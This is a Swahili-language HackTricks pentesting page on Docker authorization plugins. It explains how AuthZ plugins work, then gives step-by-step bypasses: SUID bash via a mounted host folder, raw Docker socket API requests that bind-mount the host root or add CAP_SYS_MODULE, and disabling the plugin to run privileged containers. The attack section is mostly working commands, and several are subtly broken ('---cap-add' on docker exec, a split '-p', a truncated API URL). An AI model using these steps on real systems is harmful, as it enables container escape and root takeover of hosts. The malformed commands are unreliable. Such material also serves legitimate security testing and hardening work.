<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


Mfano wa msingi wa **uthibitishaji** wa Docker ni **au yote**. Mtumiaji yeyote mwenye ruhusa ya kufikia Docker daemon anaweza **kutekeleza amri yoyote** ya mteja wa Docker. Hii pia ni kweli kwa wito unaotumia API ya Engine ya Docker kuwasiliana na daemon. Ikiwa unahitaji **udhibiti mkubwa wa ufikiaji**, unaweza kuunda **programu-jalizi za uthibitishaji** na kuziweka kwenye usanidi wa Docker daemon yako. Kwa kutumia programu-jalizi ya uthibitishaji, msimamizi wa Docker anaweza **kuweka sera za ufikiaji za kina** kwa kusimamia ufikiaji wa Docker daemon.

# Muundo wa msingi

Programu-jalizi za Uthibitishaji wa Docker ni **programu-jalizi za nje** unazoweza kutumia kuwezesha/zuia **vitendo** vilivyotakiwa kwa Docker Daemon **kulingana** na **mtumiaji** aliyetaka na **kitendo** kilichotakiwa.

**[Maelezo yafuatayo yanatoka kwenye nyaraka](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wakati ombi la **HTTP** linapofanywa kwa Docker **daemon** kupitia CLI au kupitia API ya Engine, **mfumo wa uthibitishaji** unapitisha ombi kwa **programu-jalizi za uthibitishaji** zilizosanikishwa. Ombi lina mtumiaji (mpigaji simu) na muktadha wa amri. **Programu-jalizi** inawajibika kuamua ikiwa ita **ruhusu** au **kukataa** ombi.

Mchoro wa mfululizo hapa chini unaonyesha mchakato wa ruhusu na kukataa uthibitishaji:

![Mchakato wa Ruhusu Uthibitishaji](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Mchakato wa Kukataa Uthibitishaji](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Kila ombi lililotumwa kwa programu-jalizi **linajumuisha mtumiaji aliyeidhinishwa, vichwa vya HTTP, na mwili wa ombi/jibu**. Ni **jina la mtumiaji** na **njia ya uthibitishaji** iliyotumiwa tu ndio inayopitishwa kwa programu-jalizi. Muhimu zaidi, **sifa za mtumiaji au alama hazipitishwi**. Hatimaye, **siyo mwili wote wa ombi/jibu unatumiwa** kwa programu-jalizi ya uthibitishaji. Ni mwili wa ombi/jibu tu ambapo `Content-Type` ni `text/*` au `application/json` ndio unatumiwa.

Kwa amri ambazo zinaweza kuchukua udhibiti wa uunganisho wa HTTP (`HTTP Upgrade`), kama vile `exec`, programu-jalizi ya uthibitishaji inaitwa tu kwa ombi la kwanza la HTTP. Mara tu programu-jalizi inapoidhinisha amri, uthibitishaji hautumiki kwa sehemu iliyobaki ya mchakato. Hasa, data ya utiririshaji haipitishwi kwa programu-jalizi za uthibitishaji. Kwa amri ambazo zinatoa majibu ya HTTP yaliyogawanywa, kama vile `logs` na `events`, ombi la HTTP pekee linatumwa kwa programu-jalizi za uthibitishaji.

Wakati wa usindikaji wa ombi/jibu, mchakato fulani wa uthibitishaji unaweza kuhitaji kuuliza maswali zaidi kwa Docker daemon. Ili kukamilisha mchakato kama huo, programu-jalizi zinaweza kuita API ya daemon kama mtumiaji wa kawaida. Ili kuwezesha maswali haya ya ziada, programu-jalizi lazima zitoa njia ya msimamizi kuwezesha usanidi wa uthibitishaji na sera za usalama.

## Programu-Jalizi Kadhaa

Wewe ndiye **anayesajili** programu-jalizi yako kama sehemu ya **kuanza** kwa Docker daemon. Unaweza kusanikisha **programu-jalizi nyingi na kuziunganisha pamoja**. Mnyororo huu unaweza kuwa na utaratibu. Kila ombi kwa daemon linapita kwa utaratibu kupitia mnyororo. Ni wakati **programu-jalizi zote zinaruhusu ufikiaji** kwa rasilimali, ndipo ufikiaji unaruhusiwa.

# Mifano ya Programu-Jalizi

## Twistlock AuthZ Broker

Programu-jalizi [**authz**](https://github.com/twistlock/authz) inakuwezesha kuunda faili rahisi ya **JSON** ambayo **programu-jalizi** itakuwa **ikisoma** ili kuidhinisha maombi. Kwa hivyo, inakupa fursa ya kudhibiti kwa urahisi sana ni API zipi zinaweza kufikiwa na mtumiaji gani.

Hii ni mfano ambao utaruhusu Alice na Bob kuunda kontena mpya: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Kwenye ukurasa [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) unaweza kupata uhusiano kati ya URL iliyotakiwa na kitendo. Kwenye ukurasa [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) unaweza kupata uhusiano kati ya jina la kitendo na kitendo

## Mafunzo Rahisi ya Programu-Jalizi

Unaweza kupata **programu-jalizi rahisi kuelewa** na habari ya kina kuhusu usanikishaji na uchunguzi hapa: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Soma `README` na msimbo wa `plugin.go` ili kuelewa jinsi inavyofanya kazi.

# Kudukua Programu-Jalizi ya Uthibitishaji wa Docker

## Tathmini ufikiaji

Vitu muhimu vya kuangalia ni **endpoints zipi zinaruhusiwa** na **thamani zipi za HostConfig zinaruhusiwa**.

Kufanya tathmini hii unaweza **kutumia zana** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` isiyoruhusiwa

### Ruhusa ya Chini
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Kuendesha chombo na kisha kupata kikao cha mamlaka

Katika kesi hii, msimamizi wa mfumo **amezuia watumiaji kufunga diski na kuendesha vyombo na bendera ya `--privileged`** au kutoa uwezo wowote ziada kwa chombo:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Hata hivyo, mtumiaji anaweza **kuunda kikao ndani ya kontena inayofanya kazi na kumpa mamlaka ya ziada**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Sasa, mtumiaji anaweza kutoroka kutoka kwenye chombo kwa kutumia moja ya [**njia zilizojadiliwa hapo awali**](./#privileged-flag) na **kuongeza mamlaka** ndani ya mwenyeji.

## Weka Folda Inayoweza Kuandikwa

Katika kesi hii, msimamizi wa mfumo **amezuia watumiaji kuendesha vyombo na bendera ya `--privileged`** au kutoa uwezo wowote ziada kwa chombo, na amewaruhusu tu kuweka folda ya `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Tafadhali kumbuka kuwa huenda usiweze kufunga saraka `/tmp` lakini unaweza kufunga **saraka nyingine inayoweza kuandikwa**. Unaweza kupata saraka zinazoweza kuandikwa kwa kutumia: `find / -writable -type d 2>/dev/null`

**Tafadhali kumbuka kuwa sio saraka zote kwenye kompyuta ya Linux zitasaidia biti ya suid!** Ili kuchunguza ni saraka zipi zinasaidia biti ya suid, endesha `mount | grep -v "nosuid"` Kwa mfano, kawaida `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` na `/var/lib/lxcfs` hazisaidii biti ya suid.

Pia kumbuka kuwa ikiwa unaweza **kufunga `/etc`** au saraka nyingine **yenye faili za usanidi**, unaweza kuzibadilisha kutoka kwenye kontena ya docker kama mtumiaji wa root ili **kuzitumia vibaya kwenye mwenyeji** na kuongeza mamlaka (labda kwa kubadilisha `/etc/shadow`)
{% endhint %}

## Ncha ya API isiyosahihishwa

Jukumu la msimamizi wa mfumo anayeweka programu-jalizi hii ni kudhibiti vitendo na mamlaka gani kila mtumiaji anaweza kufanya. Kwa hivyo, ikiwa msimamizi anachukua njia ya **orodha nyeusi** na kumweka kipaumbele kwa ncha za API na sifa, anaweza **kusahau baadhi yao** ambayo inaweza kuruhusu mtu mwenye nia mbaya kuongeza mamlaka.

Unaweza kuangalia API ya docker kwenye [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Muundo wa JSON usiothibitishwa

### Binds kwenye mizizi

Inawezekana kwamba wakati msimamizi wa mfumo alipoweka kinga ya kifaa cha docker, alisahau kuhusu **parameta muhimu** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama "**Binds**".\
Katika mfano ufuatao, inawezekana kutumia hitilafu hii ya usanidi kujenga na kuendesha kontena ambalo linafunga saraka ya mizizi (/) ya mwenyeji:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Tafadhali kumbuka jinsi katika mfano huu tunatumia **`Binds`** kama ufunguo wa ngazi ya juu katika JSON lakini katika API inaonekana chini ya ufunguo **`HostConfig`**
{% endhint %}

### Binds katika HostConfig

Fuata maagizo sawa na **Binds katika root** kwa kufanya **ombi** hili kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Kufunga kwenye mizizi

Fuata maagizo yaleyale kama kwa **Kufunga kwenye mizizi** kwa kutekeleza **ombi** hili kwenye API ya Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Kufunga katika HostConfig

Fuata maagizo sawa na **Binds katika root** kwa kufanya **ombi** hili kwa Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributi ya JSON ambayo hayajakaguliwa

Inawezekana kwamba wakati msimamizi wa mfumo alipoweka firewall ya docker, **alipuuza baadhi ya sifa muhimu ya parameter** ya [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kama vile "**Capabilities**" ndani ya "**HostConfig**". Katika mfano ufuatao, inawezekana kutumia hitilafu hii ya usanidi kujenga na kuendesha chombo na uwezo wa **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** ndiyo ufunguo ambao kwa kawaida una **mamlaka muhimu** za kutoroka kutoka kwenye kontena. Hata hivyo, kama tulivyozungumza hapo awali, angalia jinsi matumizi ya Binds nje yake pia yanavyofanya kazi na yanaweza kukuruhusu kuepuka vizuizi.
{% endhint %}

## Kulemaza Plugin

Ikiwa **sysadmin** amesahau **kuzuia** uwezo wa **kulemaza** **plugin**, unaweza kutumia hii fursa kulemaza kabisa!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Kumbuka **kuwasha upya programu-jalizi baada ya kuongeza kiwango cha upatikanaji**, au **kuanzisha upya huduma ya docker haitafanya kazi**!

## Mbinu za Kudukua Programu-Jalizi ya Uthibitishaji

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Marejeo

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
